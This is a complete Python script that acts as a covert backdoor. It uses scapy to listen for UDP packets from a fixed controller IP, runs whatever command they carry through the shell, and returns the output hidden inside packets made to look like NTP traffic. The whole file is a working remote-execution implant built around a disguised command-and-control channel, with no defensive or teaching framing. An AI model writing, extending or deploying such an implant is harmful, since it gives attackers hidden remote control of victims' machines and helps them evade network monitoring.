from scapy.all import *
import subprocess
import struct

SENDER_IP = "192.168.10.50"
PORT = 54321
BUFFER_SIZE = 512  # Increased buffer size to 512 bytes

def create_response(output):
    # Truncate output to BUFFER_SIZE bytes
    output_bytes = output.encode().ljust(BUFFER_SIZE, b"\x00")[:BUFFER_SIZE]
    ntp_packet = (b"\x1b" + b"\x00" * 3 + struct.pack("!d", 0.0) + struct.pack("!d", 0.0) + output_bytes)
    return IP(dst=SENDER_IP)/UDP(sport=PORT, dport=PORT)/Raw(load=ntp_packet)

def run_command_with_timeout(command, timeout=10):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(timeout=timeout)
        return stdout.decode(errors="ignore").strip()
    except subprocess.TimeoutExpired:
        process.kill()
        return "Command timed out."
    except Exception as e:
        return f"Error: {e}"

def handle_packet(packet):
    if packet.haslayer(UDP) and packet[UDP].dport == PORT:
        print(f"[+] Received packet from {packet[IP].src}")
        payload = bytes(packet[UDP].payload)
        command = payload[16:].replace(b"\x00", b"").decode(errors="ignore").strip()
        print(f"[DEBUG] Command: {repr(command)}")
        if command == "READY":
            print("[+] Responding to READY")
            send(create_response("READY"), verbose=False)
        else:
            try:
                print(f"[+] Executing: {command}")
                output = run_command_with_timeout(command, timeout=10)
                print(f"[DEBUG] Command output: {repr(output)}")
                send(create_response(output), verbose=False)
                print(f"[+] Sent output to {SENDER_IP}")
            except Exception as e:
                print(f"[-] Error executing command: {e}")
                send(create_response(f"Error: {e}"), verbose=False)

def main():
    print("[*] Starting receiver...")
    sniff(filter=f"udp and port {PORT} and host {SENDER_IP}", prn=handle_packet)

if __name__ == "__main__":
    main()